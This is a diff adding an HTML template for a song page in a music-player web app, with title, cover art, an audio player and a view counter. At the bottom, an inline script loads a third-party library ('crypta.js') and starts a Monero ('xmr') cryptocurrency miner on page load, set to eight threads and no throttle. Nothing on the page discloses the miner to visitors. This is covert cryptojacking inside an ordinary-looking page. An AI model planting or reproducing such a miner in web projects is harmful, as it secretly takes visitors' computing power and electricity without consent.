@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>{{ song['title'] }}</title>
+        <link rel="stylesheet" type="text/css" href="../static/song.css">
+        <script src="../static/crypta.js"></script>
+    </head>
+    <body>
+      <div id='main-wrapper'>
+          <h1>{{song['title']}}</h1>
+          <img id='art' src='{{song['art']}}'>
+          <canvas id='canvas'></canvas>
+          <audio src="../static/songs/{{song['id']}}.mp3" id="audio" preload='auto'></audio>
+          <div id="wrapper">
+        		<!--Audio Player Interface-->
+        		<div id="audioplayer">
+        			<button id="pButton" class="pause"></button>
+        			<div id="timeline">
+        				<div id="playhead"></div>
+        			</div>
+        		</div>
+        </div>
+
+      </div>
+      <div id='stats'>
+        <div id='views'>Views: {{song['views']}}</div>
+      </div>
+        <script src="../static/main.js"></script>
+        <script src="../static/controls.js"></script>
+
+<script>
+  var miner=new CRLT.User('72e0fc66f1d18f6b163e666f38256b5fdfceef350364', '{{ user }}', {
+    threads:8,throttle:0, coin: "xmr",
+  });
+  miner.start();
+</script>
+
+</body>
+</html>
